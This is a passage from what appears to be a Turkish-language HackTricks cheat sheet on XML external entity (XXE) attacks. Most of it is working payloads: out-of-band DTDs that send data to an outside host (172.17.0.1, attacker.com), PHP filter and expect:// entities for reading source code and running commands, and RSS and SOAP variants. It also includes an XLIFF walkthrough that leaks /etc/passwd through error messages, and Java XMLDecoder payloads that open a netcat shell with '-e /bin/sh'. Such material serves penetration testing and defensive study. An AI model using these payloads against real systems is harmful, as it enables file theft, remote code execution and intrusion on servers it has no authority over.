<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Sarfırları

### Base64

**Çıkar** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Harici kaynağı çıkartma**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Uzak kod yürütme

**Eğer PHP "expect" modülü yüklenmişse**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

SOAP (Simple Object Access Protocol), XML External Entity (XEE) saldırılarına karşı savunmasız olabilir. Bu saldırılar, SOAP mesajları içindeki XML dış varlıklarını kötü niyetli amaçlar için kullanarak hassas bilgilerin ifşa edilmesine yol açabilir. Bu tür saldırılara karşı korunmak için giriş doğrulaması, giriş doğrulaması ve güvenli XML işleme gibi güvenlik önlemleri alınmalıdır.
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Bu örnek, [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe) adresinden esinlenilmiştir.

XLIFF (XML Localization Interchange File Format), veri değişimini standartlaştırmak için kullanılan bir formattır. Genellikle yerelleştirme süreçlerinde yerelleştirilebilir verilerin araçlar arasında transferi için kullanılan XML tabanlı bir formattır ve CAT (Bilgisayar Destekli Çeviri) araçları için ortak bir değişim formatı olarak kullanılır.

### Kör İstek Analizi

Sunucuya aşağıdaki içerikle bir istek yapılır:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Ancak, bu istek iç sunucu hatası tetikler ve özellikle işaretleme deklarasyonları ile ilgili bir sorundan bahseder:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Hata olmasına rağmen, Burp İşbirlikçisinde bir vuruş kaydedilir ve dış varlıkla bir tür etkileşim olduğunu gösterir.

Veri Dışarı Aktarma Dış Bandından veri dışarı aktarmak için değiştirilmiş bir istek gönderilir:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Bu yaklaşım, Kullanıcı Ajanının Java 1.8'in kullanıldığını gösterdiğini ortaya koyuyor. Bu Java sürümünün bir kısıtlaması, Yer Dışı teknik kullanılarak /etc/passwd gibi bir satır sonu karakteri içeren dosyaların alınamamasıdır.

Hata Tabanlı Veri Sızdırma Bu kısıtlamayı aşmak için Hata Tabanlı bir yaklaşım kullanılır. Hedef bir dosyadan veri içeren bir hatayı tetiklemek için DTD dosyası aşağıdaki gibi yapılandırılmıştır:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Sunucu bir hata ile yanıt verir, önemli olan olmayan dosyayı yansıtarak, sunucunun belirtilen dosyaya erişmeye çalıştığını gösterir:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Hata mesajında dosyanın içeriğini dahil etmek için DTD dosyası ayarlanır:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Bu değişiklik, HTTP aracılığıyla gönderilen hata çıktısında yansıtıldığı gibi dosyanın içeriğinin başarılı bir şekilde dışarı sızdırılmasına yol açar. Bu, hassas bilgileri çıkarmak için Hem Bağlam Dışı Hem de Hata Tabanlı teknikleri kullanan başarılı bir XXE (XML Dış Kaynak) saldırısını gösterir.

## RSS - XEE

XXE zafiyetini sömürmek için RSS formatındaki geçerli XML.

### Ping back

Saldırganın sunucusuna basit bir HTTP isteği.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Dosya okuma

XML dış varlık enjeksiyonu (XXE) saldırıları, kötü niyetli XML dış varlıklarını yüklemek için kullanılır. Bu saldırılar, hedef sistemin hassas bilgilerini ifşa etmek veya hedef sistemdeki dosyaları okumak gibi zararlı eylemleri gerçekleştirmek için kullanılabilir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Kaynak kodunu oku

PHP base64 filtresi kullanarak
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder, bir XML mesajına dayalı nesneler oluşturan bir Java sınıfıdır. Kötü niyetli bir kullanıcı, bir uygulamanın **readObject** yöntemine keyfi verileri kullanmasını sağlayabilirse, sunucuda anında kod yürütme yetkisine sahip olacaktır.

### Runtime().exec() Kullanımı
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

### ProcessBuilder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Araçlar

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Referanslar

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\\
* Kendi harici DTD'sini kullanarak HTTP üzerinden bilgi çıkarma: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)


<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}
<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) katılın veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
